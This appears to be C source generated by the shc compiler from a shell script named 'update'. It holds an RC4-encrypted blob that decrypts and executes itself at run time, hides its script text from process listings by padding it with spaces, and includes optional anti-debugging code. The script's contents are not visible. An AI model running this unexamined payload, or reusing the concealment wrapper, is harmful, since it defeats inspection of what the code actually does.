#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	shc -r -T -f ./update 
#endif

static  char data [] = 
#define      chk2_z	19
#define      chk2	((&data[3]))
	"\344\143\120\035\317\207\213\367\252\373\077\350\300\110\251\357"
	"\215\174\206\320\236\276\351\365"
#define      tst2_z	19
#define      tst2	((&data[26]))
	"\245\004\361\104\317\045\011\243\233\233\070\227\262\277\162\112"
	"\251\322\047\116\007\005\057\164"
#define      text_z	788
#define      text	((&data[59]))
	"\151\331\030\213\033\353\200\246\206\251\002\074\162\270\121\205"
	"\237\350\104\117\350\072\315\122\324\150\247\356\031\060\203\147"
	"\111\155\100\274\315\055\074\052\150\371\005\357\132\132\346\066"
	"\331\146\323\142\314\005\202\253\232\345\111\311\300\061\360\272"
	"\201\260\325\224\351\251\115\005\035\150\373\107\107\213\056\102"
	"\363\202\257\077\156\256\335\120\270\360\063\235\145\174\340\366"
	"\077\372\270\114\365\274\223\123\036\347\005\361\203\130\227\135"
	"\037\377\101\212\374\023\276\024\211\060\061\120\235\221\360\030"
	"\236\127\122\363\142\333\260\015\227\057\053\201\030\324\217\015"
	"\321\007\115\360\104\146\304\245\052\016\252\346\124\335\360\062"
	"\207\025\001\327\143\205\020\035\101\047\366\270\236\156\006\313"
	"\213\145\000\371\140\055\266\372\004\140\230\352\204\226\225\200"
	"\147\235\265\100\353\064\044\120\123\066\220\355\350\263\025\166"
	"\221\257\102\306\305\242\007\315\177\014\002\006\371\157\241\214"
	"\174\127\155\211\237\051\271\263\073\101\344\036\240\341\136\004"
	"\221\327\250\001\210\033\370\311\020\137\140\206\044\131\305\351"
	"\371\257\034\255\316\212\211\260\053\062\375\046\324\011\175\306"
	"\214\251\071\025\040\025\374\333\346\376\010\350\134\300\254\023"
	"\034\314\067\033\025\126\312\307\222\100\004\111\032\015\100\216"
	"\234\240\120\107\341\243\300\041\030\326\267\034\002\311\044\154"
	"\275\204\033\267\213\013\142\370\114\044\314\044\077\217\121\135"
	"\107\025\051\217\277\354\042\224\140\061\145\377\124\231\132\002"
	"\243\230\154\002\053\307\007\171\023\205\100\010\370\057\265\061"
	"\052\054\077\151\325\156\050\206\113\344\200\154\162\042\373\314"
	"\200\361\165\341\060\061\333\151\124\347\011\235\270\204\003\057"
	"\237\367\035\163\205\134\224\044\353\034\341\005\031\111\037\335"
	"\371\067\104\216\155\205\212\105\077\363\305\232\065\203\314\335"
	"\054\101\217\137\231\001\163\114\032\124\315\347\353\272\117\263"
	"\106\265\032\225\202\347\044\267\241\116\001\360\361\243\201\107"
	"\121\155\223\050\273\065\211\055\267\136\166\140\131\042\243\270"
	"\123\036\073\226\143\354\053\340\120\163\137\140\325\325\243\136"
	"\102\073\142\215\137\160\331\205\043\070\013\061\323\027\255\151"
	"\166\116\215\253\177\245\050\032\005\047\033\313\331\250\117\032"
	"\021\021\361\267\044\352\303\223\255\003\246\206\207\136\051\143"
	"\026\323\043\337\370\163\340\233\134\260\020\334\277\300\152\147"
	"\123\114\026\200\261\121\124\347\067\146\045\172\136\343\362\243"
	"\230\020\173\074\201\101\111\157\374\167\130\272\335\231\071\103"
	"\156\047\124\001\157\151\360\253\364\101\042\230\266\316\354\060"
	"\114\007\344\043\376\337\142\233\102\134\347\114\207\041\246\144"
	"\272\046\040\260\021\364\362\040\357\052\336\217\246\026\005\307"
	"\364\121\377\233\023\162\072\105\047\006\214\150\054\264\153\315"
	"\253\313\324\142\005\072\202\275\055\153\044\352\007\356\275\351"
	"\111\313\167\305\327\301\314\164\277\005\126\152\101\145\375\121"
	"\152\373\046\163\152\251\101\160\363\020\371\232\224\047\324\067"
	"\116\120\257\020\054\324\336\064\241\332\070\256\253\170\203\345"
	"\337\375\375\355\211\110\075\222\051\253\117\135\042\030\042\314"
	"\033\236\102\106\015\010\243\247\321\251\262\061\226\140\106\316"
	"\243\344\063\207\141\260\336\334\334\370\350\340\046\121\044\016"
	"\253\306\071\026\324\063\326\202\053\346\104\246\310\015\005\264"
	"\367\172\230\350\224\276\166\117\036\311\153\122\017\246\330\226"
	"\230\270\011\174\033\131\145\021\077\317\324\345\324\331\024\111"
	"\261\043\146\032\375"
#define      tst1_z	22
#define      tst1	((&data[872]))
	"\152\046\277\300\040\207\046\041\204\213\370\274\110\342\145\315"
	"\355\252\046\177\322\142\127\027\116"
#define      pswd_z	256
#define      pswd	((&data[946]))
	"\207\147\172\220\344\226\352\112\247\052\031\174\020\356\125\045"
	"\070\007\110\236\041\106\035\307\137\210\356\036\171\275\340\000"
	"\045\132\221\011\361\174\123\230\246\155\024\267\134\152\334\224"
	"\162\045\063\223\156\327\253\103\070\046\033\353\047\272\132\151"
	"\014\361\115\305\155\066\335\043\043\150\077\327\313\254\224\160"
	"\150\160\365\326\107\240\031\200\306\065\154\356\357\307\127\374"
	"\270\245\301\046\333\236\112\376\007\211\326\322\065\152\103\236"
	"\333\070\164\043\331\216\243\240\303\017\216\262\327\346\256\217"
	"\213\160\265\147\016\000\146\025\211\074\350\277\246\053\135\201"
	"\143\322\245\074\140\110\334\043\130\153\326\057\121\205\277\335"
	"\365\165\104\004\165\252\032\377\346\002\276\215\055\034\017\221"
	"\356\264\316\116\374\253\161\125\026\110\205\150\315\104\105\303"
	"\271\211\307\057\064\341\056\033\343\354\250\021\010\267\243\367"
	"\153\161\105\150\034\267\276\063\377\103\233\314\207\341\217\101"
	"\153\127\160\237\070\237\272\034\214\142\056\225\032\321\214\206"
	"\102\321\356\137\210\254\223\207\360\056\124\167\020\344\271\173"
	"\073\052\032\164\311\325\220\125\070\277\353\122\220\167\330\323"
	"\110\307\063\321\164\306\131\144\365\255\334\005\222\225\200\315"
	"\277\232\101\211\160\322\337\250\221\312\372\042\102\323\365\212"
	"\233\050\134\017\153\121\133\312\331\111\351\122\007\311\123\055"
	"\044\344\066\025\140\212\255\007\370\302\276\124\055\232\350\237"
	"\300\033\063\053\154\217\366\106\330\337\230\340\250\353\015\314"
	"\320\104\342\060\317"
#define      chk1_z	22
#define      chk1	((&data[1252]))
	"\122\002\326\357\225\300\152\277\135\254\314\062\012\261\321\230"
	"\377\367\361\072\114\213\074\366\033\200\221"
#define      msg1_z	42
#define      msg1	((&data[1279]))
	"\040\310\336\351\272\114\034\044\132\353\306\345\245\073\252\117"
	"\325\051\207\252\146\156\024\041\324\112\207\234\316\331\163\334"
	"\235\221\116\377\222\357\225\300\320\376\163\123\175\214"
#define      date_z	1
#define      date	((&data[1324]))
	"\077"
#define      rlax_z	1
#define      rlax	((&data[1325]))
	"\272"
#define      msg2_z	19
#define      msg2	((&data[1330]))
	"\251\307\050\356\331\010\300\177\111\057\125\233\167\230\336\345"
	"\050\315\303\321\274\055\331\252"
#define      xecc_z	15
#define      xecc	((&data[1352]))
	"\221\205\241\361\213\154\047\121\012\054\011\242\075\367\216\247"
	"\134"
#define      opts_z	1
#define      opts	((&data[1367]))
	"\161"
#define      shll_z	10
#define      shll	((&data[1368]))
	"\134\324\036\066\032\025\055\141\035\154\055"
#define      lsto_z	1
#define      lsto	((&data[1379]))
	"\134"
#define      inlo_z	3
#define      inlo	((&data[1380]))
	"\270\275\327"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !defined(TRACEABLE)

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !defined(TRACEABLE) */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
